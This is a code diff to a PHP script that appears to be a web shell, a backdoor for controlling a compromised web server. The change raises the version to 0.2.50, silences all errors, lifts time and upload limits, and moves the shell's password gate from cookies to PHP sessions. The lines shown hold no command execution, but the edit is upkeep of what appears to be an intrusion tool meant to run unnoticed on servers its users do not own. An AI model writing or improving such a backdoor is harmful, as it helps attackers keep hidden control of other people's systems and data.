@@ -1,14 +1,15 @@
 <?php
-error_reporting(0);
-ini_set('display_errors', 0);
-ini_set('display_startup_errors', 0); 
-error_reporting(E_ERROR | E_PARSE);
+@session_start();
+@error_reporting(0);
+@ini_set('display_errors', 0);
+@ini_set('display_startup_errors', 0); 
+//error_reporting(E_ERROR | E_PARSE);
 //error_reporting(E_ALL);
 @set_time_limit(0);
 @ini_set('max_execution_time',0);
 @ini_set('memory_limit','128M');
 @ini_set('upload_max_filesize','40M');
-define('VERSION','0.2.40');
+define('VERSION','0.2.50');
 define('F_ROOT',str_replace('\\','/',(($cwd = getcwd()) ? $cwd : ($_SERVER['SCRIPT_FILENAME'] ? dirname($_SERVER['SCRIPT_FILENAME']) : '.'))).'/');
 define('S_ROOT',str_replace('\\','/',$_SERVER['DOCUMENT_ROOT']));
 define('IS_WIN',DIRECTORY_SEPARATOR=='\\');
@@ -37,25 +38,23 @@ header("content-Type: text/html; charset=utf-8");
 header("content-Type: text/html; charset=iso-8859-1");
 }
 if($haz == "logout") {
-	scookie('godssid', '', -86400 * 365);
-	p('<meta http-equiv="refresh" content="1;URL='.$self.'">');
-	p('<a style="font:12px Verdana" href="'.$self.'">Success</a>');
+	$_SESSION = [];
+	session_destroy();
+	header("Location: $self");
 	exit;
 }
 if($admin['check']) {
-$password2 = sha1($password);
 	if($doing == 'login') {
-		scookie('godpwd', $password);
-		if($admin['pass'] == $password2) {
-			scookie('godssid', $password);
-			p('<meta http-equiv="refresh" content="1;URL='.$self.'">');
-			p('<a style="font:12px Verdana" href="'.$self.'">Success</a>');
+		if($admin['pass'] === sha1($password)) {
+			session_regenerate_id(true);
+			$_SESSION['logged_in'] = true;
+			header("Location: $self");
 			exit;
 		}
-	} else {
-		if($_COOKIE['godpwd'] && $_COOKIE['godssid']) {
-			if(sha1($_COOKIE['godssid']) != $admin['pass'] || sha1($_COOKIE['godpwd']) != $admin['pass']) loginpage();
-		} else loginpage();
+	}
+	if (empty($_SESSION['logged_in'])) {
+		loginpage();
+		exit;
 	}
 }
 $errmsg='';
